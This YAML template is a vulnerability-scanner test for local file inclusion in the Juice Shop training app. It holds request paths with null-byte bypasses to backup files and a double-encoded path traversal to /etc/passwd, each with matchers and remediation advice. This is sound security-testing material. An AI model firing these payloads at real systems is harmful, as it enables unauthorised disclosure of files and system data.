id: juice-shop-lfi-null-byte
info:
  name: Local File Inclusion - Null Byte Injection
  owasp_category: A05:2025
  severity: high
  description: Tests for LFI vulnerabilities using null byte and path traversal
  tags:
    - lfi
    - path-traversal
    - info-disclosure

requests:
  - path: /ftp/package.json.bak%2500.md
    method: GET
    matchers_condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - juice-shop
          - dependencies
    on_match:
      vulnerability: LOCAL_FILE_INCLUSION
      message: Null byte bypass exposes package.json - sensitive dependency information disclosed
      remediation: Sanitize file paths; reject paths containing null bytes and directory traversal sequences

  - path: /ftp/coupons_2013.md.bak%2500.md
    method: GET
    matchers:
      - type: status
        status:
          - 200
    on_match:
      vulnerability: LOCAL_FILE_INCLUSION
      message: Null byte bypass exposes backup files - sensitive business data accessible
      remediation: Block access to backup files; use secure file storage outside webroot

  - path: /ftp/..%252f..%252f..%252fetc%252fpasswd
    method: GET
    matchers_condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - root
          - bin
    on_match:
      vulnerability: PATH_TRAVERSAL
      message: Double-encoded path traversal accesses /etc/passwd - critical system file exposed
      remediation: Normalize all file paths; validate against allowed directory whitelist

  - path: /ftp/acquisitions.md%00.pdf
    method: GET
    matchers:
      - type: status
        status:
          - 200
    on_match:
      vulnerability: LOCAL_FILE_INCLUSION
      message: Null byte injection bypasses extension check - internal documents exposed
      remediation: Validate file extensions server-side; reject null bytes in filenames

  - path: /ftp/package.json.bak
    method: GET
    matchers:
      - type: status
        status:
          - 200
    on_match:
      vulnerability: UNRESTRICTED_FILE_ACCESS
      message: Backup files directly accessible without authentication
      remediation: Disable directory listing; restrict access to configuration and backup files
